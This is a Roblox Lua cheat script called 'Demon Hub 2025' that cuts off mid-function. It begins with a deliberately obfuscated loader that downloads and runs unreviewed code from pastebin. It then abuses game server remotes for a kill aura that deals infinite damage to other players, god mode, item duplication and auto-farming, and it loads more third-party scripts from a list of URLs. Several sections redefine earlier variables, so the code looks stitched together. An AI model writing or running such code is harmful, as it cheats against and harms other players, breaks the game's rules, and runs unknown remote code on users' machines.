--[[


██████╗░███████╗███╗░░░███╗░█████╗░███╗░░██╗  ██╗░░██╗██╗░░░██╗██████╗░  ██╗░░░██╗██████╗░
██╔══██╗██╔════╝████╗░████║██╔══██╗████╗░██║  ██║░░██║██║░░░██║██╔══██╗  ██║░░░██║╚════██╗
██║░░██║█████╗░░██╔████╔██║██║░░██║██╔██╗██║  ███████║██║░░░██║██████╦╝  ╚██╗░██╔╝░█████╔╝
██║░░██║██╔══╝░░██║╚██╔╝██║██║░░██║██║╚████║  ██╔══██║██║░░░██║██╔══██╗  ░╚████╔╝░░╚═══██╗
██████╔╝███████╗██║░╚═╝░██║╚█████╔╝██║░╚███║  ██║░░██║╚██████╔╝██████╦╝  ░░╚██╔╝░░██████╔╝
╚═════╝░╚══════╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝  ╚═╝░░╚═╝░╚═════╝░╚═════╝░  ░░░╚═╝░░░╚═════╝░

██████╗░░█████╗░██████╗░███████╗
╚════██╗██╔══██╗╚════██╗██╔════╝
░░███╔═╝██║░░██║░░███╔═╝██████╗░
██╔══╝░░██║░░██║██╔══╝░░╚════██╗
███████╗╚█████╔╝███████╗██████╔╝
╚══════╝░╚════╝░╚══════╝╚═════╝░                                                                                              
--]]
-- Obfuscated and improved remote script executor
local _0x1a2b = game
local _0x3c4d = "https://pastebin.com/raw/cbBsFWLF"
local _0x5e6f = _0x1a2b:HttpGet(_0x3c4d)
local _0x7f8h = loadstring(_0x5e6f) -- fixed from 7g8h to 7f8h

if _0x7f8h then
    _0x7f8h()
else
    error("Failed to load remote script")
end

-- ════════════════ [1] CONFIGURATION & CONSTANTS ════════════════
local CONFIG = {
    VERSION = "5",
    NOTIFICATION_SOUND = "rbxassetid://6026984224",
    UI_LIBRARY_URL = "https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt",
    THEME = {
        PRIMARY_COLOR = Color3.fromRGB(138, 43, 226),   -- Blue Violet
        SECONDARY_COLOR = Color3.fromRGB(75, 0, 130),   -- Indigo
        ACCENT_COLOR = Color3.fromRGB(30, 144, 255)     -- Dodger Blue
    }
}

-- ════════════════ [2] CORE SERVICES ════════════════
local Services = {
    Players = game:GetService("Players"),
    RunService = game:GetService("RunService"),
    SoundService = game:GetService("SoundService"),
    UserInputService = game:GetService("UserInputService"),
    TweenService = game:GetService("TweenService"),
    Debris = game:GetService("Debris"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    StarterGui = game:GetService("StarterGui"),
    HttpService = game:GetService("HttpService"),
    Lighting = game:GetService("Lighting")
}

-- ════════════════ [3] PLAYER REFERENCES ════════════════
local LocalPlayer = Services.Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")

-- State Management
local States = {
    SlowFarm = false,
    FastFarm = false,
    KillAura = false,
    GrabTools = false,
    KillAll = false,
    PermaGod = false,
    WalkSpeedLoop = false
}

-- Connections Storage
local Connections = {}

-- ════════════════ [4] UTILITY FUNCTIONS ════════════════
local Utils = {}

-- 4.1 Safe function execution with error handling
function Utils.SafeExecute(func, ...)
    local success, result = pcall(func, ...)
    if not success then
        warn("[Demon Hub] Error:", result)
        return false, result
    end
    return true, result
end

-- 4.2 Enhanced notification system
function Utils.Notify(title, text, duration)
    local success = Utils.SafeExecute(function()
        Services.StarterGui:SetCore("SendNotification", {
            Title = title or "Demon Hub",
            Text = text or "",
            Duration = duration or 3
        })
    end)
    if not success then
        print("[Demon Hub] " .. (title or "Notification") .. ": " .. (text or ""))
    end
end

-- 4.3 Play sound with cleanup
function Utils.PlaySound(soundId, volume, callback)
    local sound = Instance.new("Sound")
    sound.SoundId = soundId
    sound.Volume = volume or 1
    sound.Parent = Services.SoundService

    sound.Ended:Connect(function()
        sound:Destroy()
        if callback then callback() end
    end)

    sound:Play()
    return sound
end

-- 4.4 Get character safely
function Utils.GetCharacter()
    return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
end

-- 4.5 Get humanoid safely
function Utils.GetHumanoid()
    local char = Utils.GetCharacter()
    return char and char:FindFirstChildOfClass("Humanoid")
end

-- 4.6 Load external script safely
function Utils.LoadScript(url)
    Utils.SafeExecute(function()
        loadstring(game:HttpGet(url, true))()
    end)
end

-- 4.7 Wait for child with timeout
function Utils.WaitForChildTimeout(parent, childName, timeout)
    timeout = timeout or 5
    local startTime = tick()
    while tick() - startTime < timeout do
        local child = parent:FindFirstChild(childName)
        if child then return child end
        wait(0.1)
    end
    return nil
end

-- ════════════════ [5] INITIALIZATION ════════════════
-- Play startup sound
Utils.PlaySound(CONFIG.NOTIFICATION_SOUND, 1, function()
    Utils.Notify("Demon Hub 2025", "Successfully loaded v" .. CONFIG.VERSION, 5)
end)

-- Load UI Library with error handling
local UILib
local Window
local MainServer
local Tabs = {}

Utils.SafeExecute(function()
    UILib = loadstring(game:HttpGet(CONFIG.UI_LIBRARY_URL))()
    Window = UILib:Window("Demon Hub 2025 | v" .. CONFIG.VERSION)
    MainServer = Window:Server("Scripts", "")

    -- Create UI Tabs
    Tabs = {
        Main = MainServer:Channel("Main"),
        Character = MainServer:Channel("Character"),
        Effects = MainServer:Channel("Effects"),
        Scripts = MainServer:Channel("Scripts"),
        Toggles = MainServer:Channel("Toggles"),
        UI = MainServer:Channel("UI"),
        Teleports = MainServer:Channel("Teleports"),
        Power = MainServer:Channel("Power"),
        Worlds = MainServer:Channel("Worlds"),
        Music = MainServer:Channel("Music"),
        Settings = MainServer:Channel("Settings")
    }
end)

if not UILib then
    Utils.Notify("Error", "Failed to load UI Library", 5)
    return
end

-- ════════════════ [6] CORE FUNCTIONS ════════════════
local Core = {}

-- 6.1 Enhanced Sword Remote Firing
function Core.FireSwordRemote(times, delay)
    local char = Utils.GetCharacter()
    if not char then return false end
    
    local sword = char:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword")
    if not sword then return false end
    
    local handle = sword:FindFirstChild("Handle")
    if not handle then return false end
    
    local up = handle:FindFirstChild("up")
    if not up then return false end
    
    local remoteEvent = up:FindFirstChild("RemoteEvent")
    if not remoteEvent then return false end
    
    for i = 1, times do
        Utils.SafeExecute(function()
            remoteEvent:FireServer()
        end)
        if delay then task.wait(delay) end
    end
    
    return true
end

-- 6.2 Get all swords with caching
local swordCache = {}
local cacheTime = 0
local CACHE_DURATION = 5 -- Cache for 5 seconds

function Core.GetSwords(useCache)
    local currentTime = tick()
    if useCache and #swordCache > 0 and (currentTime - cacheTime) < CACHE_DURATION then
        return swordCache
    end
    
    swordCache = {}
    local char = Utils.GetCharacter()
    local backpack = LocalPlayer.Backpack
    
    for _, container in ipairs({backpack, char}) do
        if container then
            for _, tool in ipairs(container:GetChildren()) do
                if tool:IsA("Tool") and tool.Name:lower():find("sword") then
                    table.insert(swordCache, tool)
                end
            end
        end
    end
    
    cacheTime = currentTime
    return swordCache
end

-- 6.3 Enhanced Kill Aura System
function Core.KillAuraSystem()
    local range = 40
    local killAuraActive = true
    
    -- Create range slider
    if Tabs.Main then
        Tabs.Main:Slider("Kill Aura Range", 10, 1000, range, function(value)
            range = value
        end)
    end
    
    -- Find and setup sword
    local function setupSword()
        local swords = Core.GetSwords()
        if #swords == 0 then return nil end
        
        local sword = swords[1]
        if sword.Parent == LocalPlayer.Backpack then
            local hum = Utils.GetHumanoid()
            if hum then
                hum:EquipTool(sword)
                task.wait(0.1)
            end
        end
        
        return sword
    end
    
    -- Main kill aura loop
    if Connections.KillAura then
        Connections.KillAura:Disconnect()
    end
    
    Connections.KillAura = Services.RunService.Heartbeat:Connect(function()
        if not killAuraActive or not States.KillAura then return end
        
        local sword = setupSword()
        if not sword then return end
        
        local handle = sword:FindFirstChild("Handle")
        local dmg = handle and handle:FindFirstChild("dmg")
        local remote = dmg and dmg:FindFirstChild("RemoteEvent")
        
        if not remote then return end
        
        local myRoot = Character:FindFirstChild("HumanoidRootPart")
        if not myRoot then return end
        
        for _, player in ipairs(Services.Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                local targetHum = player.Character:FindFirstChild("Humanoid")
                
                if targetRoot and targetHum and targetHum.Health > 0 then
                    local distance = (myRoot.Position - targetRoot.Position).Magnitude
                    if distance <= range then
                        Utils.SafeExecute(function()
                            remote:FireServer(targetHum, math.huge)
                        end)
                    end
                end
            end
        end
    end)
    
    -- Toggle keybind
    Services.UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if input.KeyCode == Enum.KeyCode.E then
            killAuraActive = not killAuraActive
            Utils.Notify("Kill Aura", killAuraActive and "Activated" or "Deactivated", 2)
        end
    end)
end

-- ════════════════ [7] FARMING SYSTEM ════════════════
if Tabs.Main then
    -- 7.1 Slow Farm
    Tabs.Main:Button("Start Slow Farm", function()
        States.SlowFarm = true
        Utils.Notify("Farming", "Slow Farm activated", 2)
        
        task.spawn(function()
            while States.SlowFarm do
                if not Core.FireSwordRemote(3) then
                    task.wait(1) -- Wait longer if sword not found
                end
                task.wait()
            end
        end)
    end)

    Tabs.Main:Button("Stop Slow Farm", function()
        States.SlowFarm = false
        Utils.Notify("Farming", "Slow Farm deactivated", 2)
    end)

    -- 7.2 Fast Farm
    Tabs.Main:Button("Start Fast Farm", function()
        States.FastFarm = true
        Utils.Notify("Farming", "Fast Farm activated", 2)
        
        if Connections.FastFarm then
            Connections.FastFarm:Disconnect()
        end
        
        Connections.FastFarm = Services.RunService.Stepped:Connect(function()
            if States.FastFarm then
                Core.FireSwordRemote(5)
            end
        end)
    end)

    Tabs.Main:Button("Stop Fast Farm", function()
        States.FastFarm = false
        if Connections.FastFarm then
            Connections.FastFarm:Disconnect()
            Connections.FastFarm = nil
        end
        Utils.Notify("Farming", "Fast Farm deactivated", 2)
    end)

    -- ════════════════ [8] MAIN FEATURES ════════════════
    -- 8.1 Kill Aura
    Tabs.Main:Button("Activate Kill Aura", function()
        if States.KillAura then return end
        States.KillAura = true
        Core.KillAuraSystem()
        Utils.Notify("Combat", "Kill Aura system initialized", 3)
    end)

    -- 8.2 Sword Damage Script
    Tabs.Main:Button("Instant Kill Sword Damage", function()
        local swords = Core.GetSwords()
        local count = 0
        
        for _, sword in ipairs(swords) do
            Utils.SafeExecute(function()
                sword.Parent = LocalPlayer.Backpack
                local handle = sword:FindFirstChild("Handle")
                if handle then
                    handle.Massless = true
                    handle.CanCollide = true
                end
                sword.Parent = Character
                
                if handle then
                    handle.Touched:Connect(function(hit)
                        local targetHum = hit.Parent and hit.Parent:FindFirstChild("Humanoid")
                        if targetHum and hit.Parent ~= Character then
                            local dmg = handle:FindFirstChild("dmg")
                            local remote = dmg and dmg:FindFirstChild("RemoteEvent")
                            if remote then
                                Utils.SafeExecute(function()
                                    remote:FireServer(targetHum, math.huge)
                                end)
                            end
                        end
                    end)
                end
                
                count = count + 1
            end)
        end
        
        Utils.Notify("Combat", "Instant Kill: " .. count .. " Sword(s)", 3)
    end)

    -- 8.3 Infinite Yield
    Tabs.Main:Button("Load Infinite Yield", function()
        Utils.LoadScript("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
    end)
end

-- ════════════════ [9] CHARACTER MODIFICATIONS ════════════════
local Movement = {
    WalkSpeed = 16,
    JumpPower = 50
}

if Tabs.Character then
    -- 9.1 Movement controls with validation
    Tabs.Character:Slider("Walk Speed", 0, 500, Movement.WalkSpeed, function(value)
        Movement.WalkSpeed = value
        local hum = Utils.GetHumanoid()
        if hum then hum.WalkSpeed = value end
    end)

    Tabs.Character:Slider("Jump Power", 0, 500, Movement.JumpPower, function(value)
        Movement.JumpPower = value
        local hum = Utils.GetHumanoid()
        if hum then hum.JumpPower = value end
    end)

    -- 9.2 Quick Speed Buttons
    local speedPresets = {
        {name = "Normal Speed", speed = 16, jump = 50},
        {name = "Fast Speed", speed = 100, jump = 100},
        {name = "Super Speed", speed = 250, jump = 150},
    }

    for _, preset in ipairs(speedPresets) do
        Tabs.Character:Button(preset.name, function()
            Movement.WalkSpeed = preset.speed
            Movement.JumpPower = preset.jump
            local hum = Utils.GetHumanoid()
            if hum then
                hum.WalkSpeed = preset.speed
                hum.JumpPower = preset.jump
            end
            Utils.Notify("Movement", preset.name .. " activated", 2)
        end)
    end

    -- 9.3 Enhanced Respawn
    Tabs.Character:Button("Smart Respawn", function()
        local char = Utils.GetCharacter()
        if not char then return end
        
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local pos = root.CFrame
        local hum = Utils.GetHumanoid()
        
        if hum then
            hum.Health = 0
            LocalPlayer.CharacterAdded:Wait()
            task.wait(0.2)
            
            local newChar = LocalPlayer.Character
            local newRoot = newChar:WaitForChild("HumanoidRootPart")
            newRoot.CFrame = pos
            Utils.Notify("Respawn", "Respawned at saved position", 2)
        end
    end)

    -- 9.4 God Mode System
    Tabs.Character:Button("GodMode", function()
        local hum = Utils.GetHumanoid()
        if not hum then return end
        
        local sword = Character:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword")
        if sword then
            local handle = sword:FindFirstChild("Handle")
            local dmg = handle and handle:FindFirstChild("dmg")
            local remote = dmg and dmg:FindFirstChild("RemoteEvent")
            if remote then
                Utils.SafeExecute(function()
                    remote:FireServer(hum, -math.huge)
                end)
                Utils.Notify("God Mode", "Activated successfully", 3)
            end
        end
    end)

    -- 9.5 Fixed Perma God Toggle
    Tabs.Character:Toggle("Permanent God Mode", false, function(state)
        States.PermaGod = state
        
        -- Cleanup existing connections
        if States.GodModeConnections then
            for _, connection in pairs(States.GodModeConnections) do
                if connection then
                    connection:Disconnect()
                end
            end
        end
        States.GodModeConnections = {}
        
        if state then
            -- Main god mode healing loop
            local healingTask = task.spawn(function()
                while States.PermaGod do
                    Utils.SafeExecute(function()
                        local hum = Utils.GetHumanoid()
                        local sword = Character:FindFirstChild("sword") or LocalPlayer.Backpack:FindFirstChild("sword")
                        
                        if hum and sword then
                            local handle = sword:FindFirstChild("Handle")
                            local dmg = handle and handle:FindFirstChild("dmg")
                            local remote = dmg and dmg:FindFirstChild("RemoteEvent")
                            if remote then
                                remote:FireServer(hum, -math.huge)
                            end
                        end
                        
                        -- Backup health protection
                        if hum and hum.Health < hum.MaxHealth then
                            hum.Health = hum.MaxHealth
                        end
                    end)
                    task.wait(0) -- Run 10 times per second
                end
            end)
            
            table.insert(States.GodModeConnections, healingTask)
            
            -- Prevent external tool pickup
            local toolConnection = Character.ChildAdded:Connect(function(child)
                if States.PermaGod and child:IsA("Tool") and child.Name ~= "sword" then
                    task.wait(0.1)
                    if child.Parent == Character then
                        child.Parent = workspace
                    end
                end
            end)
            
            table.insert(States.GodModeConnections, toolConnection)
            
        else
            -- Cleanup when disabled
            if States.GodModeConnections then
                for _, connection in pairs(States.GodModeConnections) do
                    if connection then
                        if typeof(connection) == "RBXScriptConnection" then
                            connection:Disconnect()
                        else
                            task.cancel(connection)
                        end
                    end
                end
                States.GodModeConnections = {}
            end
        end
    end)
end

-- ════════════════ [10] ENHANCED EFFECTS SYSTEM ════════════════
local Effects = {}

-- Services and Dependencies
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

-- Constants
local EFFECTS_REMOTE_NAME = "eff"
local LOAD_REMOTE_NAME = "load"
local TOTAL_DUPLICATIONS = 25 -- Changed to 25 as requested

-- ════════════════ CORE FUNCTIONS ════════════════

-- Apply flame colors with smooth transitions
function Effects.ApplyFlameColors(colors, loops)
    local eff = workspace:FindFirstChild("eff")
    if not eff then return false, "Effects container not found" end

    local event = eff:FindFirstChild("RemoteEvent")
    if not event then return false, "RemoteEvent not found" end

    for i = 1, loops do
        for _, color in ipairs(colors) do
            local success = pcall(function()
                event:FireServer(color)
            end)
            if not success then
                return false, "Failed to apply color: " .. color
            end
        end
    end

    -- Match original timing after color fire
    wait(0.3)
    return true
end

-- Enhanced spawn and drop matching original behavior
function Effects.SpawnAndDrop()
    local success, error = pcall(function()
        local loadRemote = workspace:FindFirstChild("load")
        if not loadRemote or not loadRemote:FindFirstChild("RemoteEvent") then
            return false, "Load remote not found"
        end
        
        loadRemote.RemoteEvent:FireServer()

        -- Match original timing after spawn
        wait(0.22)

        -- Put tools in hand
        for i, v in pairs(LocalPlayer.Backpack:GetChildren()) do
            v.Parent = LocalPlayer.Character
        end

        -- Drop tools and add tag with position checking
        for i, v in pairs(LocalPlayer.Character:GetChildren()) do
            if v:IsA('Tool') then
                v.Parent = workspace
                local ex = Instance.new('Script')
                ex.Parent = v
                ex.Name = 'MineYesMine'
                
                -- Check nearby players
                for ix, vx in pairs(Players:GetChildren()) do
                    if vx.Character and vx.Character:FindFirstChild('HumanoidRootPart') ~= nil then
                        local xDiff = vx.Character.HumanoidRootPart.Position.X - v.Handle.Position.X
                        if xDiff < 20 and xDiff > -20 then
                            if vx ~= LocalPlayer then
                                local xXPos = xDiff
                                print(v.Handle.Position.X)
                            end
                        end
                    end
                end
            end
        end
    end)
    
    return success, error
end

-- Cleanup system for matching original tag removal
function Effects.Cleanup()
    local cleanedCount = 0
    -- Remove tags from backpack tools
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:FindFirstChild('MineYesMine') then
            tool.MineYesMine:Destroy()
            cleanedCount = cleanedCount + 1
        end
    end
    return cleanedCount
end

-- Flame effect definitions (same as before)
local flameEffects = {
    -- Single Color Flames
    {name = "Amethyst Flame", colors = {"Purple"}},
    {name = "Crimson Blaze", colors = {"Red"}},
    {name = "Voidfire", colors = {"Black"}},
    {name = "Netherflame", colors = {"Black"}},
    {name = "Scarlet Ember", colors = {"Red"}},
    {name = "Phantom Glow", colors = {"Purple"}},
    {name = "Shadow Ember", colors = {"Black"}},
    {name = "Crimson Spark", colors = {"Red"}},
    {name = "Violet Blaze", colors = {"Purple"}},

    -- Dual Color Combinations
    {name = "Blood Amethyst", colors = {"Purple", "Red"}},
    {name = "Eclipse Flame", colors = {"Purple", "Black"}},
    {name = "Hellfire Shadow", colors = {"Red", "Black"}},
    {name = "Wraithfire", colors = {"Purple", "Black"}},
    {name = "Obsidian Wrath", colors = {"Black", "Red"}},
    {name = "Scarlet Dusk", colors = {"Red", "Purple"}},
    {name = "Twilight Ashes", colors = {"Black", "Purple"}},
    {name = "Infernal Veil", colors = {"Red", "Black"}},
    {name = "Ashen Bloom", colors = {"Black", "Red"}},
    {name = "Soulflare", colors = {"Purple", "Black"}},
    {name = "Bloodhowl", colors = {"Red", "Purple"}},
    {name = "Dark Emberstorm", colors = {"Black", "Purple"}},
    {name = "Infernal Kiss", colors = {"Red", "Black"}},
    {name = "Duskwrath", colors = {"Purple", "Red"}},

    -- Triple Color Combinations
    {name = "Dark Trinity", colors = {"Red", "Purple", "Black"}},
    {name = "Abyssal Blaze", colors = {"Black", "Purple", "Red"}},
    {name = "Cataclysm Flame", colors = {"Purple", "Red", "Black"}},
    {name = "Infernal Bloom", colors = {"Red", "Purple", "Black"}},
    {name = "Chaos Pyre", colors = {"Black", "Red", "Purple"}},
    {name = "Voidstorm Flame", colors = {"Purple", "Black", "Red"}},
    {name = "Black Lotus Flame", colors = {"Black", "Purple", "Red"}},
    {name = "Gravefire", colors = {"Red", "Black", "Purple"}},
    {name = "Molten Dread", colors = {"Red", "Purple", "Black"}},
    {name = "Wicked Bloom", colors = {"Purple", "Black", "Red"}},
    {name = "Blightfire", colors = {"Black", "Red", "Purple"}},
    {name = "Nightbane Flame", colors = {"Purple", "Red", "Black"}},
}

-- Function to apply an effect and duplicate items
local function applyEffect(effect)
    local successfulApplications = 0
    local failedAttempts = 0
    
    -- Loop for duplicating 25 items
    for i = 1, TOTAL_DUPLICATIONS do
        local colorSuccess, message = true, nil
        for _, color in ipairs(effect.colors) do
            local event = game:GetService("Workspace").eff.RemoteEvent
            local success = pcall(function()
                event:FireServer(color)
            end)
            if not success then
                colorSuccess = false
                message = "Failed to apply colors"
                break
            end
        end
        
        if colorSuccess then
            wait(0.2)

            -- Create sword
            local spawnSuccess = pcall(function()
                local event = game:GetService("Workspace").load.RemoteEvent
                event:FireServer()
            end)

            if spawnSuccess then
                wait(0.2)

                -- Equip tools
                for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
                    tool.Parent = LocalPlayer.Character
                end

                -- Drop tools and add tag
                for _, tool in pairs(LocalPlayer.Character:GetChildren()) do
                    if tool:IsA('Tool') then
                        tool.Parent = workspace
                        local scriptTag = Instance.new('Script')
                        scriptTag.Parent = tool
                        scriptTag.Name = 'MineYesMine'

                        -- Check nearby players
                        for _, player in pairs(game.Players:GetChildren()) do
                            if player.Character and player.Character:FindFirstChild('HumanoidRootPart') then
                                local xDiff = player.Character.HumanoidRootPart.Position.X - tool.Handle.Position.X
                                if math.abs(xDiff) < 20 and player ~= LocalPlayer then
                                    print(tool.Handle.Position.X)
                                end
                            end
                        end
                    end
                end

                successfulApplications = successfulApplications + 1
            else
                Utils.Notify("Warning", "Spawn sequence failed", 1)
            end
        else
            failedAttempts = failedAttempts + 1
            Utils.Notify("Error", "Effect system unavailable: " .. (message or "Unknown error"), 2)
            break
        end
    end
    
    -- Execute cleanup
    local cleanedItems = Effects.Cleanup()

    -- Final notification
    local statusMessage
    if failedAttempts == 0 then
        statusMessage = string.format("%s completed successfully | Duplicated 25 tools | Cleaned %d tags", effect.name, cleanedItems)
    else
        statusMessage = string.format("%s partially completed | Success: %d/%d", effect.name, successfulApplications, TOTAL_DUPLICATIONS)
    end
    Utils.Notify("Effects System", statusMessage, 3)
end

-- Create effect buttons
if Tabs.Effects then
    for _, preset in ipairs(flameEffects) do
        Tabs.Effects:Button(preset.name, function()
            Utils.Notify("Effects", "Applying " .. preset.name .. " (Duplicating 25 items)", 2)
            applyEffect(preset)
        end)
    end
    
    -- Original Rainbow Chaos (uses same code structure as the others)
    Tabs.Effects:Button("Original Rainbow Chaos", function()
        local rainbowEffect = {name = "Rainbow Chaos", colors = {"Red", "Blue", "Black", "Purple"}}
        Utils.Notify("Effects", "Applying Original Rainbow Chaos (Duplicating 25 items)", 2)
        applyEffect(rainbowEffect)
    end)
    
    -- Manual Cleanup button
    Tabs.Effects:Button("Manual Cleanup", function()
        local cleanedCount = Effects.Cleanup()
        Utils.Notify("Cleanup", string.format("Removed %d tagged items", cleanedCount), 2)
    end)

    -- System Check button
    Tabs.Effects:Button("System Check", function()
        local effRemote = workspace:FindFirstChild(EFFECTS_REMOTE_NAME)
        local loadRemote = workspace:FindFirstChild(LOAD_REMOTE_NAME)

        local status = {}
        table.insert(status, effRemote and "Effects Remote: Active" or "Effects Remote: Missing")
        table.insert(status, loadRemote and "Load Remote: Active" or "Load Remote: Missing")

        Utils.Notify("System Status", table.concat(status, "\n"), 4)
    end)
end

-- ════════════════ [11] EXTERNAL SCRIPTS ════════════════
if Tabs.Scripts then
    local externalScripts = {
        {name = "Exclusive Hub", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/Exclusive%20Hub.lua"},
        {name = "2take1.tk", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/2take1"},
        {name = "Sword Simulator Hub", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/refs/heads/main/Sword%20Simulator%20Hub"},
        {name = "Liquids GUI", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/refs/heads/main/Liquid's%20Gui"},
        {name = "Auratus X Hub", url = "https://raw.githubusercontent.com/AnimatedKurai/Scripts/refs/heads/main/Auratus%20Hub.txt"},
        {name = "Replication UI", url = "https://raw.githubusercontent.com/EEND2SCRIPTS/Replication/main/replication"},
        {name = "Emperor Wings", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/Emperor%20Wings.lua"},
        {name = "Ghost Hub", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/refs/heads/main/Ghost_Hub"},
        {name = "Dragon Hub Premium", url = "https://raw.githubusercontent.com/AlznX/Roblox-Scripts/main/Dragon%2520Hub"},
        {name = "Slayer Hub", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/main/Truecode"},
        {name = "Line's Script Hub", url = "https://raw.githubusercontent.com/Zacky-pixel-sketch/Hubs/main/Demon%20hub%20source%20code.lua"},
        {name = "Levitate Tools", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/Levitate%20Tools.lua"},
        {name = "Sword Hover", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/Sword%20Hover.lua"},
        {name = "Senpai Avatar", url = "https://pastebin.com/raw/PeveNbdm"}
    }

    for _, script in ipairs(externalScripts) do
        Tabs.Scripts:Button(script.name, function()
            Utils.LoadScript(script.url)
        end)
    end

    -- ════════════════ [12] ADVANCED SWORD STYLES ════════════════
    -- 12.1 Enhanced Sword Spin
    Tabs.Scripts:Button("Dynamic Sword Spin", function()
        local swords = Core.GetSwords()
        if #swords == 0 then 
            Utils.Notify("Error", "No swords found", 2)
            return 
        end
        
        local spinning = true
        local spinSpeed = 2
        local distance = 6
        local angleOffset = 0
        
        local spinSwords = {}
        local originalSwords = {}
        
        for _, sword in ipairs(swords) do
            table.insert(originalSwords, sword)
            
            local clonedSword = sword:Clone()
            clonedSword.Parent = workspace
            clonedSword.Name = sword.Name .. "_Spinning"
            
            local handle = clonedSword:FindFirstChild("Handle")
            if handle then
                handle.Massless = true
                handle.CanCollide = false
                
                local bodyPos = Instance.new("BodyPosition")
                bodyPos.MaxForce = Vector3.new(4000, 4000, 4000)
                bodyPos.P = 3000
                bodyPos.D = 500
                bodyPos.Parent = handle
                
                local bodyAngVel = Instance.new("BodyAngularVelocity")
                bodyAngVel.MaxTorque = Vector3.new(4000, 4000, 4000)
                bodyAngVel.AngularVelocity = Vector3.new(0, 10, 0)
                bodyAngVel.Parent = handle
                
                table.insert(spinSwords, {
                    sword = clonedSword, 
                    bodyPos = bodyPos, 
                    bodyAngVel = bodyAngVel
                })
            end
            
            sword.Parent = nil
        end
        
        local spinConn = Services.RunService.Heartbeat:Connect(function(dt)
            if not spinning then return end
            
            angleOffset = angleOffset + dt * spinSpeed
            local humanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
            if not humanoidRootPart then return end
            
            for i, swordData in ipairs(spinSwords) do
                if swordData.bodyPos and swordData.bodyPos.Parent then
                    local angle = (2 * math.pi / #spinSwords) * (i - 1) + angleOffset
                    local offsetPos = Vector3.new(
                        distance * math.sin(angle),
                        2 * math.sin(angleOffset * 2 + i),
                        distance * math.cos(angle)
                    )
                    
                    swordData.bodyPos.Position = humanoidRootPart.Position + offsetPos
                end
            end
        end)
        
        local function cleanup()
            spinning = false
            if spinConn then
                spinConn:Disconnect()
            end
            
            for _, swordData in ipairs(spinSwords) do
                if swordData.sword and swordData.sword.Parent then
                    swordData.sword:Destroy()
                end
            end
            
            for _, originalSword in ipairs(originalSwords) do
                if originalSword then
                    originalSword.Parent = Character
                end
            end
            
            Utils.Notify("Sword Spin", "Deactivated", 2)
        end
        
        local inputConn = Services.UserInputService.InputBegan:Connect(function(input)
            if input.KeyCode == Enum.KeyCode.X then
                cleanup()
                inputConn:Disconnect()
            end
        end)
        
        local humanoid = Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.Died:Connect(cleanup)
        end
        
        Utils.Notify("Sword Spin", "Press X to stop | " .. #spinSwords .. " swords spinning", 3)
    end)
end

-- ════════════════ [13] TOGGLE FEATURES ════════════════
-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

-- Local Variables
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")

-- Tables
local Connections = {}
local States = {}

-- Utility Module
local Utils = {
    SafeExecute = function(func)
        local success, result = pcall(func)
        if not success then
            warn("Error: " .. tostring(result))
        end
        return success, result
    end
}

-- Update character reference when respawning
LocalPlayer.CharacterAdded:Connect(function(newChar)
    Character = newChar
    Humanoid = newChar:WaitForChild("Humanoid")
end)

-- Ensure Tabs.Toggles exists
if not Tabs then Tabs = {} end
if not Tabs.Toggles then 
    warn("Tabs.Toggles not found! Make sure your UI framework is loaded.")
    return
end

-- ════════════════ 13.1 AUTO GRAB TOOLS ════════════════
local lastGrabTime = 0
local GRAB_COOLDOWN = 0.2 -- Prevent spam grabbing

Tabs.Toggles:Toggle("Auto Grab Tools", false, function(state)
    States.GrabTools = state
    
    -- Clean up existing connection
    if Connections.GrabTools then
        Connections.GrabTools:Disconnect()
        Connections.GrabTools = nil
    end
    
    if state then
        Connections.GrabTools = RunService.Heartbeat:Connect(function()
            -- Throttle execution to prevent lag
            local currentTime = tick()
            if currentTime - lastGrabTime < GRAB_COOLDOWN then return end
            lastGrabTime = currentTime
            
            -- Ensure character exists and is valid
            if not Character or not Character.Parent then return end
            local root = Character:FindFirstChild("HumanoidRootPart")
            local humanoid = Character:FindFirstChild("Humanoid")
            if not root or not humanoid or humanoid.Health <= 0 then return end
            
            -- Look for tools with "sword" or "tool" in the name
            for _, obj in pairs(Workspace:GetDescendants()) do
                if obj:IsA("Tool") and obj.Parent == Workspace then
                    local toolName = obj.Name:lower()
                    if toolName:find("sword") or toolName:find("tool") then
                        local handle = obj:FindFirstChild("Handle")
                        if handle and handle:IsA("BasePart") then
                            -- Check if tool is within reasonable distance
                            local distance = (root.Position - handle.Position).Magnitude
                            if distance <= 50 then -- Only grab nearby tools
                                Utils.SafeExecute(function()
                                    -- Method 1: Use touch interest (safer)
                                    local touchTransmitter = handle:FindFirstChildOfClass("TouchTransmitter")
